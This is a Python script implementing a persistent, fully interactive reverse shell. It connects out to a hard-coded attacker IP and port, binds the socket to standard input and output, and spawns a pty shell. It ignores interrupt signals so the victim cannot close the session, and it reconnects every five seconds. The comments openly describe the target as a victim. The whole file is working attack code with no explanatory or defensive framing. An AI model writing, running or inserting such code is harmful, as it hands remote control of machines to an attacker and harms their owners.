import socket
import os
import pty
import time
import signal

# Attacker's IP & Port (CHANGE THESE)
ATTACKER_IP = "172.17.0.3"
ATTACKER_PORT = 2222

def block_signals():
    """Block common signals to prevent the victim from closing the shell."""
    signal.signal(signal.SIGINT, signal.SIG_IGN)   # Ignore Ctrl+C
    signal.signal(signal.SIGTSTP, signal.SIG_IGN)  # Ignore Ctrl+Z
    signal.signal(signal.SIGQUIT, signal.SIG_IGN)  # Ignore Ctrl+\

def get_default_shell():
    """Get the default shell of the system."""
    # Check common shell paths
    shells = ["/bin/bash", "/bin/sh", "/bin/zsh", "/bin/dash", "/bin/ksh"]
    for shell in shells:
        if os.path.exists(shell):
            return shell
    return None  # No valid shell found

def create_reverse_shell():
    """Create a persistent, fully interactive reverse shell."""
    while True:
        try:
            # Create a new socket and connect to the attacker
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((ATTACKER_IP, ATTACKER_PORT))

                # Block signals to prevent the victim from closing the shell
                block_signals()

                # Duplicate the socket to stdin, stdout, and stderr
                for fd in (0, 1, 2):
                    os.dup2(s.fileno(), fd)

                # Get the default shell or fall back to /bin/sh
                shell = get_default_shell() or "/bin/sh"

                # Spawn a fully interactive shell
                pty.spawn(shell)

        except (socket.error, KeyboardInterrupt, Exception) as e:
            print(f"Error: {e}. Retrying in 5 seconds...")
            time.sleep(5)  # Retry after 5 seconds

if __name__ == "__main__":
    create_reverse_shell()
